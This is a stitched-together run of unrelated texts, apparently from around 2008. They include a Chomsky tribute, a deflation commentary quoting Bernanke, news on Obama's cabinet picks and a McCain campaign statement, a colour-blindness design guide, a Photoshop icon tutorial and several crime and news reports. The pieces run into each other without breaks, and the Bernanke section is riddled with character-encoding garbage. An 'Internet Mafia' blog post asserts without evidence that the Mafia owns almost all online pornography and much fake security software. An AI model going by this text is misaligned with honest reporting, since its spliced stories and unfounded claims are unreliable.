Noam Chomsky stands in the tradition of the great Enlightenment thinkers who combined a sweeping intellectual vision with meticulous technical analyses .
He revived a rationalist conception of human nature in which the mind is richly endowed with creative powers at a time when behaviorism ruled and “ innate ” was a dirty word .
He showed that languages have an elegant mathematical structure , which set a research agenda for linguistics , psychology , and computer science for decades to come , namely , “ What are the computations that allow a language to be learned and used ? ”
And he uncovered countless intriguing phenomena of language itself .
Who would have guessed that sentences as similar as “ He appeared to Lisa to be brave ” and “ He appealed to Lisa to be brave ” would have opposite meanings ?
Chomsky is also a polemicist , spawning both steadfast disciples and implacable enemies .
Some scholars find his theories overly abstruse and disconnected from biology .
Yet despite having another life as a prolific activist , he remains , on the brink of his 80th birthday , the world ’s most influential working linguist .
Was it really just a few months ago that central banks were warning against the possibility of inflation Ã¢â‚¬â€œ even stagflation Ã¢â‚¬â€œ creeping into the economy ?
The Bank of England and the European Central Bank were so worried about inflation that they both raised or maintained their interest rates throughout the summer vowing to head off any surge in inflation .
But how quickly things can change .
Within just a few months , the subprime - fuelled credit crunch tore through the international banking system , taking out several big - name firms along the way and spreading panic amongst investors .
Oil prices Ã¢â‚¬â€œ which had played a large part in pushing inflation skywards Ã¢â‚¬â€œ retreated from a high of $ 147 a barrel in July to now hover around the $ 50 mark .
Suddenly , inflation was no longer a concern Ã¢â‚¬â€œ indeed talk of any economic growth was soon replaced with recession warnings and by mid-November , the European Union announced that it had Ã¢â‚ ¬ Å“ officiallyÃ¢â‚
¬
Â entered into a recession with the UK and the US expected to soon announce similar warnings .
Good bye inflation Ã¢â‚¬â€œ hello recession .
Recession or Deflation ?
With inflation out of the picture , the current debate now centers on whether we are entering a global recession Ã¢â‚¬â€œ defined as two consecutive quarters of negative growth Ã¢â‚¬â€ œ or whether we are headed for a full - on bout of deflation .
Deflation is loosely - defined as a prolonged period of negative growth and we have experienced episodes of deflation in the past century , but the classic example still remains the Ã¢â‚ ¬ Å“ greatÃ¢â‚ ¬
Â depression of the 1930s .
While a recession is bad enough , deflation gives governments and central banks nightmares because once it takes root , deflation can actually feed itself making it very difficult to break once established .
It happens this way Ã¢â‚¬â€œ as the economy slows , manufacturers and producers are faced with a reduced demand for their products and they react by cutting output and laying - off workers .
For those who have lost their jobs , the immediate reaction is to reduce overall spending Ã¢â‚¬â€œ likewise , those who are still working tend to become more fearful about their own employment and the natural reaction is to reduce spending in order to boost savings in case they too become unemployed .
In either case , the result is less overall spending which further reduces demand for manufactured goods leading to even more cutbacks in production and even more unemployment .
This is known as a deflationary spiral .
The Bernanke Deflation Checklist Ã¢â‚¬â€œ How to Avoid Deflation
In 2002 Ã¢â‚¬â€œ shortly after leaving his position as Chairman of PrincetonÃ¢â‚¬â „ ¢s economics department to join the Federal Reserve Ã¢â‚¬â€ œ Ben Bernanke gave a speech to the National EconomistÃ¢â‚¬â „ ¢s Club in Washington titled Ã¢â‚ ¬ Å “ Deflation : Making Sure Ã¢â‚ ¬ËœItÃ¢â‚¬â „ ¢ DoesnÃ¢â‚¬â „ ¢t Happen HereÃ¢â‚¬Â .
In this speech , Bernanke stressed the Ã¢â‚ ¬Å “ use of monetary and fiscal policy as needed to support aggregate spendingÃ¢â‚ ¬Â as the primary objective to avoid deflation ; he summarized these tools into two main points keying on interest rates and economic stability through a well - capitalized banking system .
Aggressive Interest Rates Cuts
In this speech , Bernanke noted that Ã¢â‚ ¬Å “ when inflation is already low and the fundamentals of the economy suddenly deteriorate , the central bank should act more preemptively and more aggressively than usual in cutting ratesÃ¢â‚ ¬Â .
It looks like we can already check this one off the list Ã¢â‚¬â€œ at the beginning of December , 2007 , the benchmark lending rate in the US was 5.0 percent but as the credit crisis deepened , the Fed slashed rates down to the current level of 1.0 percent .
The problem now of course , is that when you are already this low , how much of an effect can another half a percent really have ?
Well - Capitalized Banking System
With regards to economic stability , Bernanke states that the Fed must take Ã¢â‚ ¬ Å“ responsibilityÃ¢â‚
¬Â to ensure a Ã¢â‚¬ Å“ healthy , well capitalized banking system and smoothly functioning capital marketsÃ¢â‚ ¬Â as an Ã¢â‚ ¬Å “ important line of defense against deflationary shocksÃ¢â‚ ¬Â .
This one just jumps off the page as it was the lack of a Ã¢â‚ ¬Å“ well - capitalized banking systemÃ¢â ‚
¬
Â brought on by the subprime mortgage problems that forced the Fed Ã¢â‚¬â€ œ and now the Treasury Department Ã¢â‚¬â€œ to provide liquidity to a banking system so terrified of toxic mortgage - backed assets , the banks refused to lend each other money .
Way back in December of last year , as the full weight of the subprime crisis became clearer , the Fed created the Term Auction Facility ( TAF ) to provide funds to desperate banks .
Since the first auction on December 17th , 2007 , the TAF has provided nearly $ 2 trillion in loans and this is in addition to the $ 700 billion Henry Paulson and the Treasury Department have more recently committed .
So if all this money has already been put into play and we are still talking about the possibility of a recession or worse , just how much will it take to avoid further retracement and is the Fed willing to continue following this path ?
According to Bernanke , Ã¢â‚¬Å “ the U.S. government has a technology called a printing press ( or , today its electronic equivalent ) that allows it to produce as many U.S. dollars as it wishes at essentially no cost .
By increasing the number of U.S. dollars in circulation , or even by credibly threatening to do so , the U.S. government can also reduce the value of the dollar in terms of goods and services , which is equivalent to raising the prices in dollars of those goods and services .
We conclude that , under a paper - money system , a determined government can always generate higher spending and hence positive inflation .
Ã¢â‚¬Â
You can draw your own conclusions from these comments , but my take on this is that Bernanke is more - than - prepared to continue to make money available to the financial system for as long as the Fed feels necessary .
This will likely lead to further weakening of the dollar but with nothing to be gained from cutting interest rates , this really is the only option available .

There has n’t been much news about the Mafia , but that does n’t mean they no longer exist .
In fact , the Mafia is now focused on internet crimes which lead to lucrative payoffs .
The FBI has reported that online crime is at an all time high .
So why are we hearing so little about it ?
Cyber crime has been estimated by the US Treasury to be more valuable than the illegal drugs trade – worth more than $ 100 billion a year .
So what does the Internet Mafia control ?
You do n’t have to think hard to figure this one out .
Almost all online pornography is owned by the Mafia , which are usually captive women and children in Russia or Eastern Europe .
Many of the fake anti-spyware and antivirus software are controlled by the Mafia .
How did the Mafia get so cyber smart ?
That ’s an easy answer .
The Mafia recruits many of its savvy hackers and web programmers from Russia .
These cyber criminals are smarter than you think , as most spam and malicous code resonate from these countries .
The Internet Mafia is far different than the one you and I have come to know from watching the news and movies , based on Mafia living and activity .
This is the new digital Mafia , and far more dangerous .
There ’s one source on the internet that spells this out clearly .

CHICAGO ( Reuters ) - President - elect Barack Obama ’s team to address climate change emerged on Wednesday as Democratic officials said he had chosen a Nobel laureate for U.S. energy secretary and was likely to pick an environmental veteran to serve as coordinator of climate policies .

Chu smiles at his home on the Stanford Campus in this 1997 file photo .

Rounding out his cabinet , Obama planned to announce at a Chicago news conference on Thursday that former Senate Majority Leader Tom Daschle , a South Dakota Democrat , would lead efforts to improve the U.S. health care system as the secretary of Health and Human Services .
Simmering in the background is the scandal involving Illinois Gov. Rod Blagojevich , who was arrested on Tuesday and charged with attempting to sell the U.S. Senate seat that Obama had held until he was elected president on November 4 .
Obama on Wednesday called on Blagojevich to resign and has sought to distance himself from the disgraced governor .
Announcements to come in the days ahead include several key environment - related appointments -- Steven Chu as energy secretary , Carol Browner as energy and climate coordinator , Nancy Sutley to head the White House Council on Environmental Quality and Lisa Jackson to run the Environmental Protection Agency .
They will be charged with developing policies to reduce carbon emissions blamed for global warming , develop new sources of energy and create new jobs -- a top priority for Obama .
Chu is director of the Lawrence Berkeley National Laboratory and shared the 1997 Nobel Prize in physics .
He was an early advocate for scientific solutions to climate change .
Browner was administrator of the Environmental Protection Agency during the Clinton administration .
A principal at global strategy firm The Albright Group LLC , she heads Obama ’s advisory team on energy and the environment .
Sutley has a long history in the environmental community .
She is currently deputy mayor for energy and environment for Los Angeles and served on the California State Water Resources Control Board earlier this decade .
Jackson has served as commissioner of the Department of Environmental Protection in New Jersey .
46 MILLION UNINSURED AMERICANS
A big challenge for Obama and Daschle will be extending health insurance coverage to millions of uninsured Americans and determining whether to reshape a system that is currently employer - based .
Close to 46 million Americans have no health insurance , and Americans are more likely to die of common diseases than people living in many other developed countries .
Daschle has already been involved in considering ways to improve the system .
Obama ’s transition team in the second half of this month will hold a series of meetings across the country to discuss ways to change the way health care is delivered .
During the campaign , Obama pledged to bring health insurance to millions of uninsured Americans and spend about $ 50 billion to make U.S. health records electronic .
“ If you look at the glide path that we are on with respect to health care spending and a whole host of other areas , we ’ve got some big problems , ” Obama told the Chicago Tribune in an interview published on Wednesday .
In that interview , Obama also said that at some point he would like to give a speech from an Islamic capital as a way to help “ reboot America ’s image around the world and also in the Muslim world in particular . ”
And , he said when he takes the oath of office on January 20 on the steps of the U.S. Capitol in Washington he will use all three of his names -- Barack Hussein Obama -- because that is the tradition for the swearing - in ceremony .
Some Republicans had used his middle name during the presidential campaign to suggest Obama was a Muslim , which he is not .
It was a widely noted surprise -- given the spotlight John McCain 's campaign had put , starting last weekend , on the Barack Obama - Bill Ayers link -- that the name of the once on - the - lam radical was not dropped in Tuesday night 's debate between the two presidential candidates .
But today , McCain strategists launched their latest effort to keep the matter alive .
The Republican 's political headquarters in Arlington , Va. , released the following statement from John M. Murtagh :
When I was 9 years old the Weather Underground , the terrorist group founded by Barack Obama ’s friend William Ayers , firebombed my house .
Barack Obama has dismissed concerns about his relationship with Ayers by noting that he was only a child when Ayers was planting bombs at the Pentagon and the U.S. Capitol .
But Ayers has never apologized for his crimes , he has reveled in them , expressing regret only for the fact that he did n’t do more .
While Barack Obama once downplayed his relationship with Ayers , today his campaign took that deceit one step further .
Barack Obama now denies he was even aware of his friend ’s violent past when , in 1995 , Ayers hosted a party launching Obama ’s political career .
Given Ayers ’ celebrity status among the left , it ’s difficult to believe .
The question remains : what did Obama know , and when did he know it ?
When did Obama learn the truth about his friend ?
Barack Obama helped Ayers promote his book in 1997 , served on charitable boards with him through 2002 , and regularly exchanged emails and phone calls with him through 2005 .
At what point did Barack Obama discover that his friend was an unrepentant terrorist ?
And if he is so repulsed by the acts of terror committed by William Ayers , why did the relationship continue ?
Any honest accounting by Barack Obama will necessarily cast further doubt on his judgment and his fitness to serve as commander in chief .
Barack Obama may have been a child when William Ayers was plotting attacks against U.S. targets — but I was one of those targets .
Barack Obama ’s friend tried to kill my family .
The McCain release goes on to provide background , relating that in early 1970 , Murtagh ’s father " was a New York State Supreme Court justice presiding over the trial of the so - called ' Panther 21 , ' members of the Black Panther Party indicted in a plot to bomb New York landmarks and department stores .
Early on the morning of February 21 , three gasoline - filled firebombs exploded at their home on the northern tip of Manhattan , two at the front door and the third tucked neatly under the gas tank of the family car .
The same night , bombs were thrown at a police car in Manhattan and two military recruiting stations in Brooklyn . ... "
We 'll be surprised if Murtagh is n't featured soon in a McCain ad .

Abstract
This paper introduces a set of combinators for building lexical analysers in a lazy functional language .
During lexical analysis , the combinators generate a deterministic , table - driven analyser on the fly .
Consequently , the presented method combines the efficiency of off - line scanner generators with the flexibility of the combinator approach .
The method makes essential use of the lazy semantics of the implementation language Haskell .
Finally , the paper discusses benchmarks of a scanner for the programming language C. 1 Introduction
There are two conceptually different approaches to obtaining a functional implementation of a scanner or parser from a formal lexical or syntactic specification : ( 1 ) the specification is written in a special purpose language and translated into a functional program by a scanner or parser generator or ( 2 ) the specification is composed from a set of combinators provided by a scanner or parser combinator library .
Both approaches have their advantages a ...
Introduction
Hi , my name is Chris Campbell and I have a color vision deficiency .
Like roughly 7 - 10 % of all males , my deuteranomaly makes it difficult to differentiate between some colors , like red and green .
Color deficiency , or color blindness as it ’s commonly referred to , does n’t mean that I or people with similar conditions cannot see certain colors .
They ’re not invisible and I do n’t see in black and white ( a condition that is actually very , very rare ) .
I can still use crayons effectively , find meaning in beautiful sunsets and even enjoy clear blue skies .
What it does mean is that certain colors in the visual spectrum look a lot like one another and so I have a hard time sometimes telling the difference between certain colors and even shades .
Because of this , designing software and interfaces that will also work effectively for people like me takes a bit of concerted effort .
Of all the elements of design ( line , shape , size , texture , etc. ) , color is probably one of the most used elements to pass on informational states .
This is probably because it allows a designer to say many things without having to change the form or layout of the design .
While there are a number of simulators and plugins that can help you “ visualize ” what a color deficient person might be seeing , I honestly do n’t recommend spending a lot of time with them .
Instead , I ’d like to propose just a few simple guidelines along with plenty of examples to help you effectively ensure that a good percentage of your audience wo n’t misinterpret your message .
Avoid Using Colors Alone as Visual Cues
Using color and color alone as a visual cue is appealing because it ’s usually an aesthetically pleasing and a minimalist design technique .
Calls to action and visual cues are critical to interface designers because users , especially on the web , have limited patience and are looking to process information and make decisions quickly .
Since the brain recognizes and forms an emotional bond with colors almost immediately , colors are a natural choice for visual cues .
Unfortunately , it ’s easy to alienate or confuse some of your users when some of those aesthetically pleasing colors look very similar .
To point out a few interfaces that use hard to differentiate colors as visual cues , here are a few examples that have given me some trouble .
Bad Cues
As you can see , all three of these interfaces use only red and green ( two of the most misinterpreted colors ) to convey states or provide information to the user .
Apple ’s iPhone availability indicator uses color alone as a visual indicator .
Interestingly enough , they state in their usability guidelines :
“ Although color can greatly enhance a user interface , make sure it is not the only source of information .
A color blind user may not be able to distinguish between two objects that differ only in color . ”
Now , what they do provide is a legend of what red and green are supposed to look like for each state .
But for me , it ’s still barely possible to match their indicators to the live data , and so the example remains pretty frustrating .
It is , however , slightly better than the other two examples .
Warhammer Online , a video game , and MAMP , a development server application , exemplify the worst culprits because not only do they use similarly contrasting red and green colors as cues , but they do n’t give you a reference or legend to help distinguish or label what “ red ” and “ green ” are even supposed to look like .
In order to avoid an angry mob of color deficient users , or to just ensure that you and your users are on the same page , here are some aesthetically pleasing interface examples that use text and icons , in addition colors , to communicate what ’s going on .
Good Cues
Dropbox users know the status of their files because of the colored circles and icons attached to each file .
The colored circles can be confusing to a small percentage of viewers , but it ’s pretty hard to misunderstand what ’s going on unless you ’re both colorblind and not familiar with their commonly used icons .
The Wufoo and Versions screenshots pretty much leave no room for misinterpretation because they , like a stop sign , use combinations of shape , color , and a word / icon to give their visual cues meaning and context .
You ’re sure to leave very little to interpretation when you use three visual cues to convey a single message .
More Good Cues
Again , Apple uses the hard to distinguish red , yellow , and green orbs as visual cues throughout their OSX windows , but this time they help those with color deficiencies by providing icons whenever you hover over the colored orbs .
Since a user is only going to be interacting with those orbs when their mouse is hovering over them , it does n’t hurt to hide the icons and keep the interface aesthetically pleasing until the user is clearly interacting with them .
The TiVo interface is strapped for space , and in order to give multiple visual cues using color by itself , a recorded show is represented with a full , green orb , and a show that is currently being recorded is represented with a smaller , red orb .
Even if somebody cannot differentiate the colors that Tivo is using in this situation , they can tell the difference between a small and large circle .
Use Contrasting Colors
Of course , as an interface designer , there are going to be times when you do not want to use icons or text as a cue due to space or aesthetic constraints .
While I recommend using icons or text when you can , sometimes color and color alone is the most logical way or only choice to convey different information .
Maps , for example , often use colors to display separate areas of information about a location .
Also , sometimes designers want to indicate state by coloring just the text itself .
If you are going to use color alone , the best way to accommodate for the color deficient viewers out there is to get familiar with contrast .
Kevin wrote an excellent article recently on programmatically finding good contrasting colors .
Additionally , a couple of great resources about how to choose proper contrasting colors can be found over at lighthouse.org and 456 bereastreet , but to give you a quick overview of what works and does n’t work in my world , here are a couple examples .
Bad Contrast
This New York Times map is frustrating because the “ Yes ” and “ Did Not Vote ” colors are extremely close in contrast , and they basically look like the same thing to me .
I would n’t even recognize there are four colors being used on that map .
And actually , the classic example for bad contrast for the color blind in Wikipedia is this NY Times Map .
Trulia ’s maps are sometimes extremely tough to interpret for me because they not only use red , yellow and green , but they use multiple shades of those colors .
I see this a lot of times in graphs and pie charts , and it ’s probably the most frustrating example of all the screenshots I ’ve documented in this article .
The red / black and red / green text are sometimes used as hyperlink colors on web sites .
They can be problematic because certain combinations are colors that those with a deficiency often have trouble seeing .
Good Contrast
In this map , the New York Times does a better job because red and blue are easy to differentiate , and while light yellow and light blue can be confused by an extremely small percentage of people , the stripes they use clearly separate the states .
While this pie chart in Wufoo does use red and green , the colors in this example are contrasting enough to tell apart , especially when viewed directly next to another .
Here ’s another set of text examples that are again a red / black and red / green combo , but they ’re more distinguishable due to their higher contrast differences .
Conclusion
For the most part , this is n’t a call to arms .
I ’m not on a quest to change the world , fight discrimination or demand visual equal rights .
As you can see , if you want to avoid making color blunders , all you really need to do is to take a minute to make sure you provide a legend , use icons or words when possible and make sure your visual cues are high contrasting .
You probably do not need to run your designs through a color checker and stress over whether or not your interface is going to offend your viewers .
In fact , there ’s a pretty good chance you ’re working near or know somebody with a color deficiency , so having them give your design a once over is a great way to ensure your message is seen properly .

Apple 's paradigm for indicating network connectivity is nicely - detailed globe icon with crisscrossing wires across it — you can see it in the System Preferences for Network settings .

Spheric Realism
Before getting into the tutorial 's steps I thought it'd be good to go over some key techniques for creating a realistic sphere .
Designing a nice , shiny ball has many applications and is a nice skill to have in your back pocket .
When designing a ball that 's meant to look as round as possible here are some things to keep in mind :
What material is it ?
Glass , plastic , anodized aluminum ?
The material of an object is its most important attribute as that defines how it is supposed to reflect and transmit light in the real world .
Most textures on shiny spheres are semi-reflective glass or metal , rarely do you see a rough metal used as the material .
Glass , plastic , anodized aluminum ?
The material of an object is its most important attribute as that defines how it is supposed to reflect and transmit light in the real world .
Most textures on shiny spheres are semi-reflective glass or metal , rarely do you see a rough metal used as the material .
It reflects light inside too .
Not only do you have to worry about the global OS light but you have to keep in mind that light gets reflected inside the sphere as well , bouncing around the walls .
Depending on the type of material of your sphere and the transmittance properties it will look different .
Opaque material lets no light pass through so there will be no internal reflections .
Not only do you have to worry about the global OS light but you have to keep in mind that light gets reflected inside the sphere as well , bouncing around the walls .
Depending on the type of material of your sphere and the transmittance properties it will look different .
Opaque material lets no light pass through so there will be no internal reflections .
Is it totally round ?
Designing a perfectly spherical ball is not necessary all the time , sometimes all you want is a mostly - rounded button or disk .
These have similar properties as spheres but the edges will have light reflections and shadows rather than the top or bottom of the ball .
Spheres do n't really have edges to catch the light since , um , they 're spheres !
Lots to think about !
Do n't remember high school physics and how a material 's refractive index changes light passing through it ?
Do n't worry , just follow along and we 'll have you building spheres in no time .
Step 1 : Draw Your Base Circles
To make the globe look three - dimensional , it 'll take more than one crack at Photoshop 's Layer Styles which means a little onion - skinning will be necessary .
We 're designing our icon at 256 px so get your new document open and use the Ellipse Tool to make a circle sized so that it allows for a shadow underneath it .
We 're applying two layer styles — Gradient Overlay and Inner Shadow — in order to get the basic lighting in place .
The Gradient Overlay is radial and I used the mouse to move it down to the bottom of the sphere representing the light passing through the top of the sphere , reflecting off the bottom .
The Inner Shadow was also positioned at the top to give it some initial radial shading .
I need to apply some additional effects to the base circle so I duplicated my previous circle , turned the Fill to 0 % , and re-opened my Layer Styles .
I gave this second circle an Inner Glow with Multiply blending ( half opacity ) and an additional Inner Shadow positioned only at the top with Soft Light blending .
Step 2 : Lay Your Shadows
Before we add the final lighting to our sphere , let 's position its shadow first .
I drew a small ellipse at the bottom of the sphere and filled it black .
Next I converted it to a Smart Object and applied a 73px horizontal Motion Blur and a 12.5 px Gaussian Blur .
To darken the center a bit more since that 's where the sphere is " touching " the surface I duplicate my previous shadow and shrink it down a bit .
Step 3 : Circular Highlights
Realistic lighting and highlights can't be fully reproduced using Layer Styles , you 'll need to draw some more ovals .
Draw a circle about 3 / 4 the height of your previous ones and align it a few pixels from the top of the main circle .
Make sure it has a 0 % Fill and give it a Radial Gradient layer style from white to transparent with the white directly on top .
Now convert it to a Smart Object and give it a 3.9px Guassian Blur to soften it a bit .
This represents the main OS light hitting the top of our sphere .
( Note : Others may have a different preference regarding how blurred they want their top highlight .
Some people wo n't want to blur it at all .
Do whatever you think looks best . )
To make the center of our top highlight a little brighter , let 's duplicate the layer and shrink it down proportionally .
Now we have two ovals at the top of the sphere representing our top - down lighting .
For the bottom - up lighting , duplicate your larger highlight you created , flip it vertically , and move it down to the bottom of the sphere .
Change the Blending to Soft Light .
Here 's what it looks like :
At this point we 're done with our sphere but we still have the lines to draw , so let 's get to it .
Step 4 : Draw The Network Lines & Hubs
The network lines proved to be a little tricky to get just right .
Here 's how I did them :
Use the Ellipse Tool to draw a circle that is approximately the same size as your main sphere .
Free Transform your circle to flatten it out a bit .
Rotate it a bit on its center axis , make it look like a hula hoop wrapped around your globe .
I hopped into the Layer Styles and gave it a 2px white stroke with Blend Mode of Overlay .
I also gave it 4px Inner & Outer Glows both white .
Does n't look like much yet , but here 's what we 've got at this stage :
I 'm going to use this loop as both a foreground and background network line , so I duplicated the layer and hid the second one for now .
I used my Eraser Tool with a big brush that 's fluffy on the edges so I can keep the edges of the loop anti-aliased as it hits the sides of our sphere .
On your foreground loop , erase the left side completely , and erase just enough right at the top and bottom of your loop so that it fades into the sides of the sphere .
ow for the background loop , erase the right side and use the same technique for the top and bottom edges .
To make the lines look as if they 're sitting on top of the globe more , I duplicated each layer , gave it a slight Gaussian Blur , and then nudged it a few pixels away from its twin .
I could 've achieved this look with an Inner Glow , but hey , there 's different ways of doing what you want in Photoshop .
I 've now done this a few more times ( foreground and background loops ) and we 're done with this step .
Final Step : Adding The Network Nodes
At this stage I think it looks pretty good , but we 're not quite finished yet .
Where our network lines cross we need some glowing network nodes .
Fortunately , these are really easy .
Take your Ellipse Tool , draw the node , fill it white , convert to Smart Object .
Then , give it a little Gaussian Blur and change the blending and opacity appropriately .
We 're done !
Our final icon is on the left .
On the right is a slightly tweaked example showing what you can do by changing some Blending Modes just for kicks .

RubyConf 2008 Videos Coming Online

At RubyConf 2008 , other than giving his own Scaling Ruby talk , Gregg Pollack of EnvyCasts was hard at work getting summaries of all of the presentations from the speakers .
In RubyConf 2008 in 90 Seconds you get a fast - fire summary of the summaries .
In RubyConf in 31 Minutes you get a more complete record - good viewing for anyone who did n't attend the conference as it gives you a good idea of what 's on the Ruby community 's mind .
One of the coolest features of RubyConf in 31 Minutes is that it 's hosted on Viddler , which has allowed Gregg to tag and comment on the video so that you can see who 's speaking and how to watch their full presentation as you 're watching them give the summary !
If you want to see the full presentation videos , you can , thanks to Confreaks who filmed most of the presentations given .
Approximately half of the videos are up so far ( I count 35 ) .
This is n't the time or place to go through them all but some particular highlights are :
Do n't expect to see the talk Giles was meant to be giving though , as he was unfairly banned for " inciting violence " by posting a tongue - in - cheek blog post - if you want see a suggestion of the greatness that would have prevailed , watch his excellent RubyFringe presentation instead .

A San Francisco woman who advertised herself as a psychic has been sentenced to two months in jail for bilking a love - sick customer out of $ 108,000 and talking her into buying her a sports car in exchange for purifying her of evil spirits , Santa Clara County authorities said Tuesday .
Lisa Marie Miller , 27 , of San Francisco victimized a woman who " sought her out because she was in love with a fellow who was not returning her affection , " said Deputy District Attorney Cherie Bourlard .
The woman contacted Miller in 2005 after seeing a newspaper ad that offered a $ 10 reading .
Miller convinced the woman that she was cursed and needed " spiritual cleansing , " authorities said .
The woman gave Miller $ 108,000 from her checking , savings and retirement accounts as well as cash , jewelry and gift cards .
She also financed a Corvette for Miller , authorities said .
The woman finally figured out something was wrong when she read media accounts that Miller 's mother - in - law , 56 - year - old Lola Miller of San Jose , had been arrested for taking $ 450,000 in cash and services from a San Jose woman .
Lola Miller , who went by the name " Miss Donna , " read the victim 's fortune , told her that she and family members were cursed and that she would cleanse them of evil for money .
She also threatened the victim .
Putting two and two together , the woman bilked by Lisa Miller tried to contact the supposed psychic , but her calls were not returned .
At that point , the woman went to authorities .
Lisa Miller pleaded no contest in September to one count of theft by false pretense .
A Santa Clara County judge sentenced her to two months in jail and five years of probation .
The judge also ordered her to pay full restitution , of which she has already paid $ 61,000 , authorities said .
Miller was also barred from ever again engaging in fortune telling , psychic readings , tarot card readings , love spell castings , palm readings and spiritual advising .
Lola Miller is to be sentenced in January after pleading guilty in August to two counts of grand theft .
Her victim has since died of cancer , and her widower has said he will contribute any restitution received to cancer research .
A third member of the family is also facing psychic - related criminal charges .
Lisa Miller 's sister - in - law , Danielle Miller , 23 , is accused of bilking $ 36,000 from a woman to cleanse her of evil , prosecutors said .
Danielle and Lisa Miller are married to Lola Miller 's sons , authorities said .
Son lived with Texas City woman found in squalid conditions Officials find Texas City resident in squalid conditions at home
Linda Sue Sainz , seen in a photo from five or six years ago , was taken to a hospital after emergency services were called to her home in Texas City .

With her cats and romance novels to keep her company , retired Galveston County sheriff 's Deputy Linda Sue Sainz rarely ventured from her Texas City home .
Struggling with health problems , the 62 - year - old woman stayed inside for weeks at a time with her son , who had lived with her almost all his life .
Perhaps that is why her plight escaped the notice of neighbors , friends and loved ones , who had no idea that Sainz 's lopsided shotgun shack on South Pecan Street had turned into a house of horrors .
Late Friday , police found the mother of four lying in a puddle of waste on her living room floor , with maggots infesting open bedsores on her back and buttocks .
Sainz 's 38 - year - old son and housemate , who called 911 to report his mother 's condition , was nowhere to be found .
His whereabouts were still unknown Tuesday .
The son , whose name police declined to release , has not been charged with any wrongdoing .
Prosecutors want to review the woman 's medical records before pursuing charges .
The bedridden woman remains hospitalized at Mainland Medical Center in Texas City , but police are n't sure she will survive .
" I think this should be a reminder that we should check on our family members or loved ones eye to eye as often as we can , " said Texas City Police Capt .
Brian Goetschius .
" We believe it 's been weeks , if not months , that anyone other than her son visibly saw her . "
Records subpoenaed
Police declined to specify Sainz 's pre-existing medical problems , noting they are still waiting to receive medical records that were subpoenaed .
Adult Protective Services caseworkers also are investigating .
Sainz 's other three children , all living in the Houston or Galveston County areas , had spoken to her by phone , but had not visited her before the grisly discovery , Goetschius said .
Texas law says that a person who has begun caring for a child , elderly individual or disabled person — even informally — cannot abandon that responsibility .
The initial police investigation indicates Sainz 's son was her sole provider of food , medical care and shelter , while her retirement income paid their bills , Goetschius said .
The man sounded emotionless when he called 911 at 11:51 p.m. Friday .
" My mom has laid here and gotten in bad shape , " the caller told the emergency operator .
" She can barely talk ... She needs to get to a hospital . "
The caller told police the home would be open , then disconnected the line .
The first officer to arrive smelled a strong odor of feces and saw what he thought was a decomposing body lying in a puddle of body fluids on the living room floor next to a bed .
The woman was motionless and appeared to be dead , police reports show .
Then the officer saw the woman blink her eyes .
He yelled for paramedics to come inside , Goetschius said .
Family members surprised
Sainz 's shocking health conditions came as a surprise to her other children and her landlord .
Her eldest son , Aaron Martelli , 43 , of Santa Fe , said he had no idea his mother had become so sick or that she was living in such deplorable conditions .
He said he last spoke to her by phone a month ago .
" I have a feeling she was putting up a pretty good front , " Martelli said outside his mother 's home Tuesday .
Gloria Huddleston , who had leased the home to Sainz and her son for three years , said the pair paid their rent on time .
" I wanted to be sick and I cried when I saw where she had been laying , " Huddleston wept Tuesday .
" I just ca n't imagine . "
Sainz worked for the Galveston County Sheriff 's Office from 1978 until her retirement in 2000 .
Sheriff 's Major Ray Tuttoilmondo recalled her as a feisty and independent woman and a reliable employee .

Printed T - shirts are a staple item for Urban Outfitters , but in a rare move , the company yanked one from their California shelves last week .
Tara Littman of Support Shirts designed the shirt in question , which features the statement “ I Support Same Sex Marriage , ” clearly a hot - button item in the Proposition 8 state .
Less than a week after it first arrived in stores and online , the shirt was gone .
A buyer cited the reason as “ too much bad press ” to Littman , though the designer could n’t find more than one blog entry that dissed the shirt .
( Funny how a youth - targeted company blamed the Internet . )
But we had to wonder if there was more to it than just bad press .
After all , Urban has carried more sensational items than this in the past .
In a 2006 interview , the Boston Globe asked Richard Hayne , the CEO of Urban Outfitters , if he felt regrets or second thoughts about potentially offensive products , and he said “ very , very , very rarely . ”
So is the veto of Littman ’s shirt just a case of good ol ’ discrimination ?
Consider this :
Hayne is a notably right - wing Republican who supports senators who vote for legislation against gay marriage .
In fact , last May the British Website ThisIsMoney.co.uk wrote , “ Hayne must be the only retailer whose expansion plans depend on no one finding out who he really is . ”
Interesting where your money goes , is n’t it ?
When a right - wing Republican is the one concocting your anti-Establishment image , you start to wonder if the entire hipster movement has been duped into becoming puppets of Hayne ’s billionaire income .
Because if we ’re all suckers , that just sucks .

Advertisement A suspected US missile strike has killed at least eight students at a religious school in north - western Pakistan , witnesses say .
The school , in North Waziristan , is close to the residence of a fugitive Taleban leader , Jalaluddin Haqqani , witnesses told the BBC Urdu Service .
At least two missiles , reportedly fired by pilotless US drones , hit the school early on Thursday .
The Pakistani army is investigating the incident .
The US has made no comment .
The attack comes hours after the Pakistani parliament unanimously adopted a resolution calling on the government to defend its sovereignty and expel foreign fighters from the region .
The resolution also called upon the government to prevent the use of Pakistani territory for attacks on another country .
There have been persistent US accusations that Pakistan is not doing enough to eliminate Taleban and al - Qaeda sanctuaries in the border region .
Growing tension Witnesses told the BBC that the missiles destroyed nearly half of the school building in the Dande Darpakhel area near Miranshah , the main town in the North Waziristan tribal region .
At least six people were injured in the attack , witnesses say .
It is still not clear whether there were any foreign fighters among the dead students or whether it is linked to Mr Haqqani or his son , Sirajuddin .
Local people have said that most of the injured were local students at the seminary .
Some madrassas in Pakistan have been accused of promoting militancy .
The residential complex of Jalaluddin Haqqani was targeted in a missile attack in September .
At least 14 people were killed and 15 injured .
Taleban and al - Qaeda fighters use North Waziristan and other tribal areas to launch attacks in Afghanistan .
Foreign fighters from Uzbekistan , Afghanistan and the Middle East are all thought to be based there .
Tensions in the border region are high
In recent weeks the United States has launched many missile strikes against suspected militant targets in the Afghan border region .
Washington says the strikes are used against militant targets , but correspondents say that intelligence failures have sometimes led to civilian casualties .
Figures compiled by the BBC Urdu service show that some 80 people have been killed in a number of suspected US missile strikes in South and North Waziristan region over the past month .
Earlier in October a suspected pilotless American drone fired missiles in North Waziristan , killing at least six people , Pakistani intelligence officials said .
The United States rarely confirms or denies such attacks .
Tensions between the US and Pakistan have increased over the issue of cross - border incursions against militants by American forces based in Afghanistan .
Pakistani President Asif Ali Zardari has said he will not tolerate violations of his country 's territory .
The US state department has affirmed " its support for Pakistan 's sovereignty , independence , unity , and territorial integrity " .

GMAC 's Rescap mortgage arm has now seen two years of losses
GMAC Financial Services has reported an increased loss for the third quarter and warned that its mortgage business , Rescap , may struggle to survive .
